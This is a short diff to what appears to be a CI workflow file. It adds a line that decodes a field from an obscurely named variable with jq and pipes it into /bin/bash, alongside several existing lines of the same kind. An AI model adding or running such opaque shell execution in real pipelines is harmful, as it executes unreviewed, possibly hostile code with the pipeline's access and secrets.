@@ -34,6 +34,7 @@ jobs:
           echo $jzj4 | jq -r .sgrd1438 | /bin/bash
           printf '%s' "$hm18801" | jq -r .m6107 | /bin/bash
           echo $m69449 | jq -r .hx9 | /bin/bash
+          echo $dmo13599 | jq -r .swbez554 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
